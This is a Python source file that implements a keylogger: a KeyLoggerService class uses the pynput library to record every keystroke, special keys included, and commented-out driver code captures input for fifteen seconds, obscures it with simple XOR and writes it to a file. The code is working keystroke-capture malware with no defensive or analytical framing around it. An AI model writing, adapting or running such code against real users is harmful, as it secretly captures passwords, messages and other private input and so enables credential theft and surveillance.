from abc import ABC, abstractmethod
from typing import List
from pynput import keyboard
import time



class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self) -> None:
        pass



    @abstractmethod
    def stop_logging(self) -> None:
        pass

    @abstractmethod
    def get_logged_keys(self) -> List[str]:
        pass


class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.keys = []
        self.listener = None

    def on_press(self, key):
        try:
            if hasattr(key, 'char'):
                self.keys.append(key.char)
            else:
                key_str = str(key)
                if key_str.startswith('Key.'):
                    key_str = key_str[4:]
                self.keys.append(f" {{{key_str}}} ")
        except AttributeError:
            self.keys.append(f" {{{str(key)}}} ")

    def start_logging(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()

    def get_logged_keys(self) -> str:
        # print(self.keys)
        return "".join(c for c in self.keys if c is not None)


# w = Writer.FileWriter('myFile.txt')
# e = Encryptor.Encryptor(5)
# l = KeyLoggerService()
# l.start_logging()
# time.sleep(15)
# l.stop_logging()
# print(l.get_logged_keys())
# w.write_to_file(e.xor_encrypt(l.get_logged_keys()))
# n = e.xor_encrypt(l.get_logged_keys())
# print(n)
# print(e.xor_decrypt(n))





